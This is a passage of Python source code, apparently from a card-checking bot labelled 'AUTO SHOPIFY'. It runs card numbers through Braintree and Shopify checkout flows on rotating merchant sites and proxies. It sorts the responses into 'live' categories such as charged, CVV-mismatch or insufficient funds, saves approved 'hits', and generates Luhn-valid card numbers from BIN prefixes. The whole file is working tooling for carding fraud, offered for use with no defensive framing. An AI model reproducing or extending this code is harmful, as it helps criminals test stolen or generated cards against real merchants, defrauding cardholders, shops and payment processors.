        lk_status, lk_resp = b3_three_ds_lookup(session, auth_fp, token, cc,
                                                  first, last, email, addr)
        tds_result, tds_msg, nonce = b3_classify_3ds(lk_status, lk_resp)
        
        if not nonce or tds_result in ("ERROR",):
            elapsed = round(time.time() - start_time, 2)
            return tds_result, tds_msg, tds_msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
        
        if not apm_nonce:
            elapsed = round(time.time() - start_time, 2)
            return tds_result, tds_msg, tds_msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
        
        chk_status, chk_text = b3_submit_add_payment_method(session, nonce, apm_nonce, config_data)
        result, server_msg = b3_classify_apm_response(chk_status, chk_text)
        
        if result == "RATE_LIMIT":
            time.sleep(B3_RATE_LIMIT_DELAY)
            auth_fp_new, apm_nonce_new, config_data_new = b3_refresh_auth(session)
            if auth_fp_new:
                auth_fp, apm_nonce, config_data = auth_fp_new, apm_nonce_new, config_data_new
            tok_status2, tok_resp2 = b3_tokenize_card(session, auth_fp, cc, month, year, cvv, addr)
            result2, msg2 = b3_classify_tokenize(tok_status2, tok_resp2)
            if result2 == "TOKEN":
                lk2, lr2 = b3_three_ds_lookup(session, auth_fp, msg2, cc, first, last, email, addr)
                tr2, tm2, n2 = b3_classify_3ds(lk2, lr2)
                if n2:
                    cs2, ct2 = b3_submit_add_payment_method(session, n2, apm_nonce, config_data)
                    result, server_msg = b3_classify_apm_response(cs2, ct2)
                    if result == "RATE_LIMIT":
                        result, server_msg = "DECLINED", "Rate limited - try again later"
        
        elapsed = round(time.time() - start_time, 2)
        return result, server_msg, server_msg, "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
        
    except requests.exceptions.Timeout:
        elapsed = round(time.time() - start_time, 2)
        return "ERROR", "Timeout", "Request timed out", "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data
    except Exception as e:
        elapsed = round(time.time() - start_time, 2)
        return "ERROR", str(e)[:80], str(e)[:80], "$0.00", "Braintree Auth $0", elapsed, session, auth_fp, apm_nonce, config_data

# ============================================
# BRAINTREE AUTH CARD MANAGEMENT
# ============================================

def load_b3_cards():
    return safe_json_load(B3_CARDS_FILE, [])

def save_b3_cards(cards):
    safe_json_save(B3_CARDS_FILE, cards)

def add_b3_card(cc, month, year, cvv):
    cards = load_b3_cards()
    card_str = f"{cc}|{month}|{year}|{cvv}"
    if card_str not in cards:
        cards.append(card_str)
        save_b3_cards(cards)
        return True
    return False

def clear_b3_cards():
    save_b3_cards([])

def get_all_b3_cards():
    return load_b3_cards()

def delete_b3_card(card_str):
    cards = load_b3_cards()
    if card_str in cards:
        cards.remove(card_str)
        save_b3_cards(cards)
        return True
    return False

def load_b3_hits():
    return safe_json_load(B3_HITS_FILE, [])

def save_b3_hit(hit_data):
    global b3_hits_list
    b3_hits_list.append(hit_data)
    hits = load_b3_hits()
    hits.append(hit_data)
    safe_json_save(B3_HITS_FILE, hits)

def get_b3_hits():
    global b3_hits_list
    if not b3_hits_list:
        b3_hits_list = load_b3_hits()
    return b3_hits_list

def clear_b3_hits():
    global b3_hits_list
    b3_hits_list = []
    safe_json_save(B3_HITS_FILE, [])

# ============================================
# SAFE JSON HANDLING
# ============================================

def safe_json_load(filename, default_value=None):
    if default_value is None:
        default_value = []
    if not os.path.exists(filename):
        return default_value
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            content = f.read().strip()
            if not content:
                return default_value
            return json.loads(content)
    except:
        return default_value

def safe_json_save(filename, data):
    try:
        json_str = json.dumps(data, indent=2, ensure_ascii=False)
        temp_file = f"{filename}.tmp"
        with open(temp_file, 'w', encoding='utf-8') as f:
            f.write(json_str)
        if os.path.exists(filename):
            os.remove(filename)
        os.rename(temp_file, filename)
        return True
    except:
        return False

# ============================================
# URL FUNCTIONS
# ============================================

def clean_url(url):
    if not url:
        return None
    url = url.strip()
    url = re.sub(r'^[Ss]ite\s*:\s*', '', url)
    url = re.sub(r'^[Uu][Rr][Ll]\s*:\s*', '', url)
    url = re.sub(r'^[Ww]ebsite\s*:\s*', '', url)
    url = re.sub(r'^[Ll]ink\s*:\s*', '', url)
    url = re.sub(r'^\d+\.\s*', '', url)
    url = url.strip()
    if url and not url.startswith(('http://', 'https://')):
        if '.' in url and ' ' not in url:
            url = 'https://' + url
    return url

def normalize_url(url):
    cleaned = clean_url(url)
    return cleaned if cleaned else None

def extract_url_from_text(text):
    patterns = [
        r'https?://[^\s]+',
        r'[a-zA-Z0-9][a-zA-Z0-9-]*\.[a-zA-Z]{2,}(?:/[^\s]*)?'
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            url = match.group(0)
            if not url.startswith(('http://', 'https://')):
                url = 'https://' + url
            return url
    return None

# ============================================
# CARD MANAGEMENT (SHOPIFY)
# ============================================

def load_cards():
    return safe_json_load(CARDS_FILE, [])

def save_cards(cards):
    return safe_json_save(CARDS_FILE, cards)

def add_card(cc, month, year, cvv):
    cards = load_cards()
    card_str = f"{cc}|{month}|{year}|{cvv}"
    if card_str not in cards:
        cards.append(card_str)
        save_cards(cards)
        return True
    return False

def clear_cards():
    save_cards([])

def get_all_cards():
    return load_cards()

def delete_card(card_str):
    cards = load_cards()
    if card_str in cards:
        cards.remove(card_str)
        save_cards(cards)
        return True
    return False

def validate_luhn(card_number):
    digits = [int(d) for d in str(card_number)]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        total += sum(divmod(d * 2, 10))
    return total % 10 == 0

def is_card_expired(month, year):
    try:
        now = datetime.now()
        m = int(month)
        y = int(year)
        if y < 100:
            y += 2000
        if y < now.year:
            return True
        if y == now.year and m < now.month:
            return True
        return False
    except:
        return False

def validate_cvv(cvv, cc):
    if not cvv.isdigit():
        return False
    if cc.startswith('3'):
        return len(cvv) in [3, 4]
    return len(cvv) == 3

def parse_card_line(line):
    line = line.strip()
    if not line:
        return None
    line = re.sub(r'\s+', '', line)
    parts = None
    for sep in ['|', '/', ':', ';', ',']:
        if sep in line:
            candidate = line.split(sep)
            if len(candidate) >= 4:
                parts = candidate
                break
    if not parts or len(parts) < 4:
        return None
    cc = re.sub(r'[^\d]', '', parts[0].strip())
    month = parts[1].strip()
    year = parts[2].strip()
    cvv = parts[3].strip()
    if not cc.isdigit() or len(cc) < 13 or len(cc) > 19:
        return None
    if not month.isdigit() or not year.isdigit() or not cvv.isdigit():
        return None
    if len(year) == 4:
        year = year[-2:]
    elif len(year) != 2:
        return None
    if len(month) == 1:
        month = f"0{month}"
    m = int(month)
    if m < 1 or m > 12:
        return None
    if not validate_luhn(cc):
        return None
    if not validate_cvv(cvv, cc):
        return None
    return {'cc': cc, 'month': month, 'year': year, 'cvv': cvv}

# ============================================
# SITES MANAGEMENT
# ============================================

def load_sites():
    return safe_json_load(SITES_FILE, [])

def save_sites(sites):
    sites = [s for s in sites if s and isinstance(s, str)]
    sites = list(dict.fromkeys(sites))
    return safe_json_save(SITES_FILE, sites)

def validate_site_url(url):
    if not url or not isinstance(url, str):
        return False, "Empty URL"
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    domain_match = re.search(r'https?://([^/]+)', url)
    if not domain_match:
        return False, "No domain found"
    domain = domain_match.group(1)
    if '.' not in domain:
        return False, "Invalid domain (no TLD)"
    if len(domain) < 4:
        return False, "Domain too short"
    tld = domain.split('.')[-1].lower()
    valid_tlds = ['com','org','net','shop','store','io','co','uk','de','fr','es','it',
                  'ca','au','br','mx','ar','cl','xyz','online','site','info','biz',
                  'us','eu','app','dev','me','in','jp','ru','nl','se','no','ie','pt',
                  'pl','cz','at','ch','be','dk','fi','nz','za','sg','hk','tw','kr',
                  'th','ph','vn','id','my','ae','sa','il','tr','ua','ro','bg','hr',
                  'sk','si','lt','lv','ee','is','lu','mt','cy','gr','hu']
    if tld not in valid_tlds:
        return False, f"Unknown TLD: .{tld}"
    return True, url

def check_site_alive(url, timeout=5):
    try:
        resp = requests.head(url, timeout=timeout, verify=False, allow_redirects=True,
                           headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        return resp.status_code < 500, resp.status_code, resp.elapsed.total_seconds()
    except requests.exceptions.ConnectionError:
        return False, 0, 0
    except requests.exceptions.Timeout:
        return False, 0, 0
    except:
        return False, 0, 0

def add_site(url):
    if not url:
        return False
    cleaned_url = normalize_url(url)
    if not cleaned_url:
        return False
    valid, result = validate_site_url(cleaned_url)
    if not valid:
        return False
    sites = load_sites()
    if cleaned_url not in sites:
        sites.append(cleaned_url)
        save_sites(sites)
        return True
    return False

def clear_all_sites():
    save_sites([])
    return True

def delete_site_by_index(index):
    sites = load_sites()
    if 1 <= index <= len(sites):
        removed = sites.pop(index - 1)
        save_sites(sites)
        return removed
    return None

def get_random_site():
    sites = load_sites()
    sites = [s for s in sites if s and isinstance(s, str)]
    if not sites:
        return None
    scored = []
    for s in sites:
        if s in site_stats:
            total, success = site_stats[s]
            if total >= SITE_MIN_CHECKS:
                rate = success / total
                scored.append((s, rate))
            else:
                scored.append((s, 0.5))
        else:
            scored.append((s, 0.5))
    scored.sort(key=lambda x: x[1], reverse=True)
    top_count = max(1, len(scored) // 3)
    top_sites = [s for s, _ in scored[:top_count]]
    return random.choice(top_sites)

def fix_all_sites():
    sites = load_sites()
    fixed_sites = []
    for site in sites:
        if site:
            cleaned = normalize_url(site)
            if cleaned and cleaned not in fixed_sites:
                fixed_sites.append(cleaned)
    save_sites(fixed_sites)
    return len(fixed_sites)

# ============================================
# REPORT SITE RESULT
# ============================================

def track_site_performance(url, success):
    """Track site success/failure for smart rotation"""
    if not url:
        return
    if url in site_stats:
        total, wins = site_stats[url]
        site_stats[url] = (total + 1, wins + (1 if success else 0))
    else:
        site_stats[url] = (1, 1 if success else 0)

def auto_clean_dead_sites():
    """Remove non-permanent sites with high failure rate + connectivity check"""
    global site_check_counter
    site_check_counter += 1
    if site_check_counter < SITE_AUTO_CLEAN_INTERVAL:
        return
    site_check_counter = 0
    sites = load_sites()
    removed = []
    for url in list(sites):
        if sqlite_backup.is_permanent_site(url):
            continue
        should_remove = False
        if url in site_stats:
            total, success = site_stats[url]
            if total >= SITE_MIN_CHECKS:
                fail_rate = 1 - (success / total)
                if fail_rate >= SITE_FAIL_RATE_THRESHOLD:
                    should_remove = True
                    print(f"🧹 Auto-cleaned dead site: {url} (fail rate: {fail_rate:.0%})")
        if should_remove:
            alive, status_code, _ = check_site_alive(url, timeout=3)
            if not alive:
                sites.remove(url)
                removed.append(url)
                if url in site_stats:
                    del site_stats[url]
            else:
                if url in site_stats:
                    site_stats[url] = (0, 0)
                print(f"🔄 Site {url} still alive (HTTP {status_code}), stats reset")
    if removed:
        save_sites(sites)
        print(f"🧹 Auto-maintenance: removed {len(removed)} dead sites")

def report_site_result(url, success, response_status=None, card_category=None):
    if not url:
        return
    
    track_site_performance(url, success is True)
    auto_clean_dead_sites()
    
    if card_category in ['CHARGE', '3DS', 'CVV', 'FUNDS', 'LIVE']:
        if not sqlite_backup.is_permanent_site(url):
            sqlite_backup.add_permanent_site(url)
            print(f"🏆 Sitio PERMANENTE (APPROVED - {card_category}): {url}")
        else:
            sqlite_backup.add_permanent_site(url)
        return
    
    if sqlite_backup.is_permanent_site(url):
        print(f"🔒 Sitio PERMANENTE protegido: {url}")
        return
    
    if card_category == 'UNKNOWN':
        sites = load_sites()
        if url in sites:
            sites.remove(url)
            save_sites(sites)
            print(f"❌ Sitio ELIMINADO (UNKNOWN): {url}")
        return

# ============================================
# PROXIES MANAGEMENT
# ============================================

def load_proxies():
    return safe_json_load(PROXIES_FILE, [])

def save_proxies(proxies):
    return safe_json_save(PROXIES_FILE, proxies)

def validate_proxy_format(proxy_str):
    if not proxy_str or not isinstance(proxy_str, str):
        return False, "Empty proxy"
    proxy_str = proxy_str.strip()
    parts = proxy_str.split(':')
    if len(parts) not in [2, 4]:
        return False, "Format must be IP:PORT or IP:PORT:USER:PASS"
    ip = parts[0]
    port_str = parts[1]
    ip_pattern = re.compile(r'^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$')
    match = ip_pattern.match(ip)
    if not match:
        return False, f"Invalid IP: {ip}"
    for octet in match.groups():
        if int(octet) > 255:
            return False, f"Invalid IP octet: {octet}"
    try:
        port = int(port_str)
        if port < 1 or port > 65535:
            return False, f"Invalid port: {port}"
    except ValueError:
        return False, f"Port not a number: {port_str}"
    return True, "OK"

def normalize_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    proxy_str = re.sub(r'\s+', '', proxy_str)
    return proxy_str

def add_proxy(proxy_str):
    proxy_str = normalize_proxy(proxy_str)
    valid, reason = validate_proxy_format(proxy_str)
    if not valid:
        return False
    proxies = load_proxies()
    if proxy_str not in proxies:
        proxies.append(proxy_str)
        save_proxies(proxies)
        return True
    return False

def clear_all_proxies():
    save_proxies([])
    return True

def delete_proxy_by_index(index):
    proxies = load_proxies()
    if 1 <= index <= len(proxies):
        removed = proxies.pop(index - 1)
        save_proxies(proxies)
        return removed
    return None

def delete_dead_proxies(dead_proxies):
    proxies = load_proxies()
    for dead in dead_proxies:
        if dead in proxies:
            proxies.remove(dead)
    save_proxies(proxies)
    return len(dead_proxies)

def get_random_proxy():
    proxies = load_proxies()
    if not proxies:
        return None
    now = time.time()
    available = []
    for p in proxies:
        if p in failed_proxies:
            fails, last_fail = failed_proxies[p]
            if fails >= PROXY_FAIL_THRESHOLD and (now - last_fail) < PROXY_FAIL_COOLDOWN:
                continue
            elif (now - last_fail) >= PROXY_FAIL_COOLDOWN:
                del failed_proxies[p]
        available.append(p)
    if not available:
        failed_proxies.clear()
        available = proxies
    return random.choice(available)

def report_proxy_failure(proxy_str):
    """Track proxy failures for auto-rotation"""
    if not proxy_str:
        return
    now = time.time()
    if proxy_str in failed_proxies:
        fails, _ = failed_proxies[proxy_str]
        failed_proxies[proxy_str] = (fails + 1, now)
    else:
        failed_proxies[proxy_str] = (1, now)

def report_proxy_success(proxy_str):
    """Clear failure count on success"""
    if proxy_str and proxy_str in failed_proxies:
        del failed_proxies[proxy_str]

# ============================================
# PROXY CHECKER
# ============================================

proxy_latency = {}

def check_proxy_socket(proxy_str):
    """Level 1: TCP socket connection test with latency"""
    try:
        valid, reason = validate_proxy_format(proxy_str)
        if not valid:
            return False
        parts = proxy_str.split(':')
        host = parts[0]
        port = int(parts[1])
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(PROXY_SOCKET_TIMEOUT)
        start = time.time()
        result = sock.connect_ex((host, port))
        latency = round((time.time() - start) * 1000)
        sock.close()
        if result == 0:
            proxy_latency[proxy_str] = latency
            return True
        return False
    except:
        pass
    return False

def check_proxy_http_connect(proxy_str):
    """Level 2: HTTP CONNECT tunnel test"""
    try:
        parts = proxy_str.split(':')
        if len(parts) < 2:
            return False
        host = parts[0]
        port = int(parts[1])
        proxy_url = f"http://{host}:{port}"
        if len(parts) >= 4:
            proxy_url = f"http://{parts[2]}:{parts[3]}@{host}:{port}"
        proxies_dict = {'http': proxy_url, 'https': proxy_url}
        resp = requests.get('http://httpbin.org/ip', proxies=proxies_dict, timeout=PROXY_CHECK_TIMEOUT + 2, verify=False)
        return resp.status_code == 200
    except:
        return False

def check_proxy_full(proxy_str):
    """Level 3: Full proxy verification with real HTTP request"""
    try:
        parts = proxy_str.split(':')
        if len(parts) < 2:
            return False
        host = parts[0]
        port = int(parts[1])
        proxy_url = f"http://{host}:{port}"
        if len(parts) >= 4:
            proxy_url = f"http://{parts[2]}:{parts[3]}@{host}:{port}"
        proxies_dict = {'http': proxy_url, 'https': proxy_url}
        resp = requests.get('https://www.google.com', proxies=proxies_dict, timeout=PROXY_CHECK_TIMEOUT + 3, verify=False)
        return resp.status_code == 200
    except:
        return False

def check_proxy_deep(proxy_str):
    """Deep proxy check: format + socket + HTTP CONNECT + real request"""
    valid, reason = validate_proxy_format(proxy_str)
    if not valid:
        return False, f'FORMAT_FAIL: {reason}'
    if not check_proxy_socket(proxy_str):
        return False, 'SOCKET_FAIL'
    if not check_proxy_http_connect(proxy_str):
        return False, 'HTTP_FAIL'
    if not check_proxy_full(proxy_str):
        return False, 'REQUEST_FAIL'
    return True, 'ALL_PASS'

def verify_proxy_batch(proxies, max_workers=PROXY_CHECK_WORKERS, deep=False):
    alive = []
    dead = []
    reasons = {}
    check_fn = check_proxy_deep if deep else check_proxy_socket
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(check_fn, p): p for p in proxies}
        for future in as_completed(futures):
            proxy = futures[future]
            try:
                result = future.result(timeout=PROXY_CHECK_TIMEOUT + 5)
                if deep:
                    is_alive, reason = result
                    if is_alive:
                        alive.append(proxy)
                    else:
                        dead.append(proxy)
                        reasons[proxy] = reason
                else:
                    if result:
                        alive.append(proxy)
                    else:
                        dead.append(proxy)
                        reasons[proxy] = 'SOCKET_FAIL'
            except:
                dead.append(proxy)
                reasons[proxy] = 'TIMEOUT'
    return alive, dead, reasons

def silent_proxy_check():
    proxies = load_proxies()
    if not proxies:
        return
    alive, dead, _ = verify_proxy_batch(proxies)
    if dead:
        delete_dead_proxies(dead)
        print(f"🧹 Silent proxy check: removed {len(dead)} dead proxies, {len(alive)} alive")

def start_silent_pc():
    global silent_pc_running, silent_pc_thread
    def run_silent_pc():
        global silent_pc_running
        while silent_pc_running:
            try:
                silent_proxy_check()
            except:
                pass
            for _ in range(SILENT_PC_INTERVAL):
                if not silent_pc_running:
                    break
                time.sleep(1)
    if not silent_pc_running:
        silent_pc_running = True
        silent_pc_thread = threading.Thread(target=run_silent_pc, daemon=True)
        silent_pc_thread.start()

# ============================================
# LUHN ALGORITHM & CARD GENERATOR
# ============================================

def luhn_checksum(card_number):
    """Calculate Luhn checksum digit"""
    digits = [int(d) for d in str(card_number)]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        total += sum(divmod(d * 2, 10))
    return total % 10

def generate_luhn_card(bin_prefix, length=16):
    """Generate a valid card number from BIN using Luhn algorithm"""
    bin_str = str(bin_prefix)
    remaining = length - len(bin_str) - 1
    partial = bin_str + ''.join([str(random.randint(0, 9)) for _ in range(remaining)])
    for check_digit in range(10):
        candidate = partial + str(check_digit)
        if luhn_checksum(candidate) == 0:
            return candidate
    return partial + '0'

def generate_cards_from_bin(bin_prefix, count=10):
    """Generate multiple valid cards with random expiry and CVV"""
    cards = []
    now = datetime.now()
    seen = set()
    attempts = 0
    while len(cards) < count and attempts < count * 3:
        attempts += 1
        cc = generate_luhn_card(bin_prefix)
        if cc in seen:
            continue
        seen.add(cc)
        month = random.randint(1, 12)
        year = random.randint(now.year + 1, now.year + 5) % 100
        cvv = random.randint(100, 999)
        cards.append(f"{cc}|{month:02d}|{year:02d}|{cvv}")
    return cards

# ============================================
# BIN LOOKUP
# ============================================

def bin_lookup(bin_number):
    if CACHE_BIN_RESULTS and bin_number in bin_cache:
        data, timestamp = bin_cache[bin_number]
        if time.time() - timestamp < bin_cache_expiry:
            return data
    
    for lookup_fn in [_bin_lookup_binlist, _bin_lookup_handyapi, _bin_lookup_bincodes, _bin_lookup_bincheck]:
        result = lookup_fn(bin_number)
        if result:
            if CACHE_BIN_RESULTS:
                bin_cache[bin_number] = (result, time.time())
            return result
    return None

def _bin_lookup_binlist(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=10,
                               headers={'Accept-Version': '3'})
        if response.status_code == 200:
            data = response.json()
            scheme = data.get('scheme', 'UNKNOWN').upper()
            brand = data.get('brand', '').upper()
            type_card = data.get('type', 'UNKNOWN').upper()
            prepaid = data.get('prepaid', False)
            bank = data.get('bank', {})
            bank_name = bank.get('name', 'UNKNOWN')
            country = data.get('country', {})
            country_name = country.get('name', 'UNKNOWN')
            country_code = country.get('alpha2', 'XX')
            
            flag = COUNTRY_FLAGS.get(country_code, '🌍')
            
            card_type = "PREPAID" if prepaid else type_card if type_card != 'UNKNOWN' else "CREDIT/DEBIT"
            return {
                'info': f"{card_type} - {scheme} {brand}".strip(),
                'brand': scheme if scheme else (brand if brand else 'UNKNOWN'),
                'type': card_type,
                'level': brand if brand and brand != scheme else '',
                'bank': bank_name,
                'country': f"{country_name} {flag}",
                'flag': flag,
                'country_code': country_code
            }
    except:
        pass
    return None

def _bin_lookup_handyapi(bin_number):
    try:
        response = requests.get(f"https://data.handyapi.com/bin/{bin_number}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('Status') == 'SUCCESS':
                scheme = data.get('Scheme', 'UNKNOWN').upper()
                card_type = data.get('Type', 'UNKNOWN').upper()
                bank_name = data.get('Issuer', 'UNKNOWN')
                country_name = data.get('Country', {}).get('Name', 'UNKNOWN') if isinstance(data.get('Country'), dict) else data.get('CountryName', 'UNKNOWN')
                country_code = data.get('Country', {}).get('A2', 'XX') if isinstance(data.get('Country'), dict) else 'XX'
                
                flag = COUNTRY_FLAGS.get(country_code, '🌍')
                
                return {
                    'info': f"{card_type} - {scheme}".strip(),
                    'brand': scheme if scheme else 'UNKNOWN',
                    'type': card_type if card_type != 'UNKNOWN' else 'CREDIT/DEBIT',
                    'level': '',
                    'bank': bank_name,
                    'country': f"{country_name} {flag}",
                    'flag': flag,
                    'country_code': country_code
                }
    except:
        pass
    return None

def _bin_lookup_bincodes(bin_number):
    try:
        response = requests.get(f"https://api.bincodes.com/bin/?format=json&api_key=free&bin={bin_number}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('bin'):
                scheme = data.get('card', 'UNKNOWN').upper()
                card_type = data.get('type', 'UNKNOWN').upper()
                level = data.get('level', '').upper()
                bank_name = data.get('bank', 'UNKNOWN')
                country_name = data.get('countryname', 'UNKNOWN')
                country_code = data.get('country', 'XX').upper()
                
                flag = COUNTRY_FLAGS.get(country_code, '🌍')
                
                return {
                    'info': f"{card_type} - {scheme} {level}".strip(),
                    'brand': scheme if scheme else 'UNKNOWN',
                    'type': card_type if card_type != 'UNKNOWN' else 'CREDIT/DEBIT',
                    'level': level,
                    'bank': bank_name,
                    'country': f"{country_name} {flag}",
                    'flag': flag,
                    'country_code': country_code
                }
    except:
        pass
    return None

def _bin_lookup_bincheck(bin_number):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json'
        }
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10, headers=headers)
        if response.status_code == 200:
            data = response.json()
            if data.get('bin'):
                scheme = data.get('brand', 'UNKNOWN').upper()
                card_type = data.get('type', 'UNKNOWN').upper()
                level = data.get('level', '').upper()
                bank_name = data.get('bank', 'UNKNOWN')
                country_name = data.get('country_name', 'UNKNOWN')
                country_code = data.get('country', 'XX').upper()
                prepaid = data.get('prepaid', False)
                
                flag = COUNTRY_FLAGS.get(country_code, '🌍')
                
                if prepaid:
                    card_type = 'PREPAID'
                
                return {
                    'info': f"{card_type} - {scheme} {level}".strip(),
                    'brand': scheme if scheme else 'UNKNOWN',
                    'type': card_type if card_type != 'UNKNOWN' else 'CREDIT/DEBIT',
                    'level': level,
                    'bank': bank_name,
                    'country': f"{country_name} {flag}",
                    'flag': flag,
                    'country_code': country_code
                }
    except:
        pass
    return None

# ============================================
# SHOPIFY CARD CHECKER
# ============================================

def check_card_shopify(cc, month, year, cvv):
    site = get_random_site()
    proxy = get_random_proxy()
    
    card_str = f"{cc}|{month}|{year}|{cvv}"
    api_url = f"{API_URL}/?cc={card_str}"
    
    if site:
        api_url += f"&url={site}"
    if proxy:
        api_url += f"&proxy={proxy}"
    
    start_time = time.time()
    site_used = site
    
    try:
        proxies_dict = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) >= 2:
                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
                if len(proxy_parts) >= 4:
                    proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
                proxies_dict = {'http': proxy_url, 'https': proxy_url}
        
        response = http_session.get(api_url, proxies=proxies_dict, timeout=REQUEST_TIMEOUT, verify=False)
        elapsed = time.time() - start_time
        
        if response.status_code == 200:
            result_text = response.text
            try:
                data = response.json()
                response_msg = data.get('Response', 'UNKNOWN')
                price = data.get('Price', '$0.95')
                gateway = data.get('Gate', 'Shopify Payments')
                site_used = data.get('Site', site)
                category, status_msg = classify_response(response_msg)
                
                if site:
                    report_site_result(site, True, response.status_code, category)
                if proxy:
                    report_proxy_success(proxy)
                
                return category, status_msg, response_msg, price, gateway, round(elapsed, 2), site_used
            except:
                category, status_msg = classify_response(result_text)
                if site:
                    report_site_result(site, True, response.status_code, category)
                if proxy:
                    report_proxy_success(proxy)
                return category, status_msg, result_text, "$0.95", "Shopify Payments", round(elapsed, 2), site
        else:
            if site:
                report_site_result(site, False, response.status_code, 'ERROR')
            return "ERROR", f"HTTP {response.status_code}", "", "$0.95", "Shopify Payments", round(elapsed, 2), site
    except requests.exceptions.Timeout:
        if proxy:
            report_proxy_failure(proxy)
        if site:
            report_site_result(site, False, None, 'TIMEOUT')
        return "ERROR", "TIMEOUT", "", "$0.95", "Shopify Payments", 0, site
    except Exception as e:
        if proxy:
            report_proxy_failure(proxy)
        if site:
            report_site_result(site, False, None, 'ERROR')
        return "ERROR", str(e)[:50], "", "$0.95", "Shopify Payments", 0, site

def classify_response(response_msg):
    response_upper = response_msg.upper() if response_msg else ""
    
    # CHARGE / APPROVED / ORDER COMPLETE
    if any(kw in response_upper for kw in ['CHARGED', 'CAPTURED', 'APPROVED', 'SUCCESS', 'SUCCEEDED', 'PAID', 
                                            'PAYMENT_INTENT_UNEXPECTED_STATE', 'ORDER_COMPLETE', 'ORDER COMPLETE',
                                            'ORDER_PLACED', 'ORDER PLACED']):
        return "CHARGE", response_msg
    
    # 3DS / Authentication Required (requires_action is treated as DECLINED)
    if any(kw in response_upper for kw in ['3DS', '3D_SECURE', 'THREE_D_SECURE', 'AUTHENTICATION_REQUIRED', 
                                            'REDIRECT', 'ENROLLED', 'SCA_REQUIRED']):
        return "3DS", response_msg
    
    # Requires Action (treated as declined, not live)
    if 'REQUIRES_ACTION' in response_upper:
        return "DECLINED", response_msg
    
    # CVV/CVC incorrect (card is live)
    if any(kw in response_upper for kw in ['CVV', 'CVC', 'INCORRECT_CVC', 'SECURITY_CODE', 
                                            'INVALID_CVC', 'CVC_CHECK_FAILED']):
        return "CVV", response_msg
    
    # Insufficient funds (card is live)
    if any(kw in response_upper for kw in ['INSUFFICIENT', 'FUNDS', 'INSUFFICIENT_FUNDS', 
                                            'NOT_ENOUGH', 'BALANCE']):
        return "FUNDS", response_msg
    
    # Declined reasons
    if any(kw in response_upper for kw in ['DECLINED', 'DECLINE', 'CARD_DECLINED', 'DO_NOT_HONOR',
                                            'GENERIC_DECLINE', 'RESTRICTED', 'LOST', 'STOLEN',
                                            'PICKUP', 'FRAUD', 'FRAUDULENT', 'RISK',
                                            'EXPIRED', 'EXPIRED_CARD', 'INVALID_EXPIRY',
                                            'INVALID_NUMBER', 'INCORRECT_NUMBER',
                                            'PROCESSING_ERROR', 'CARD_NOT_SUPPORTED',
                                            'INVALID_ACCOUNT', 'EXCEEDS_LIMIT',
                                            'OTP', 'NOT_PERMITTED', 'REVOCATION',
                                            'BLOCKED', 'CURRENCY_NOT_SUPPORTED',
                                            'TRANSACTION_NOT_ALLOWED', 'DO NOT TRY AGAIN',
                                            'REFER_TO_ISSUER', 'ISSUER_NOT_AVAILABLE',
                                            'TRY_AGAIN_LATER', 'WITHDRAW', 'NO_ACTION_TAKEN',
                                            'REENTER_TRANSACTION', 'INVALID_PIN']):
        return "DECLINED", response_msg
    
    return "UNKNOWN", response_msg

# ============================================
# HITS MANAGEMENT (SHOPIFY)
# ============================================

def save_hit(hit_data):
    hits = load_hits()
    hits.append(hit_data)
    safe_json_save(HITS_FILE, hits)
    global hits_list
    hits_list.append(hit_data)
    try:
        sqlite_backup.save_hit_backup(hit_data, "shopify")
    except:
        pass

def load_hits():
    return safe_json_load(HITS_FILE, [])

def clear_hits():
    global hits_list
    hits_list = []
    safe_json_save(HITS_FILE, [])

def get_hits():
    global hits_list
    if not hits_list:
        hits_list = load_hits()
    return hits_list

def export_hits_txt():
    hits = get_hits()
    if not hits:
        return None
    
    content = "\u2550" * 50 + "\n"
    content += f"  \U0001f6d2 AUTO SHOPIFY {BOT_VERSION} - APPROVED CARDS (HITS)\n"
    content += f"  \U0001f4c5 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    content += "\u2550" * 50 + "\n\n"
    
    for i, hit in enumerate(hits, 1):
        content += f"\u2501\u2501 [{i}] {hit.get('category', 'UNKNOWN')} \u2501\u2501\n"
        content += f"  \U0001f4b3 CC: {hit.get('cc', '')}|{hit.get('month', '')}|{hit.get('year', '')}|{hit.get('cvv', '')}\n"
        content += f"  \U0001f4dd Response: {hit.get('status_msg', '')}\n"
        content += f"  \U0001f4b2 Price: {hit.get('price', '$0.95')}\n"
        content += f"  \U0001f310 Gateway: {hit.get('gateway', 'Shopify Payments')}\n"
        content += f"  \u23f1 Time: {hit.get('elapsed', 0)}s\n"
        if hit.get('bin_info'):
            content += f"  \U0001f3e6 BIN: {hit.get('bin_info', {}).get('info', '')}\n"
            content += f"  \U0001f3e6 Bank: {hit.get('bin_info', {}).get('bank', '')}\n"
            content += f"  \U0001f30d Country: {hit.get('bin_info', {}).get('country', '')}\n"
        content += "\u2504" * 40 + "\n\n"
    
    content += "\u2550" * 50 + "\n"
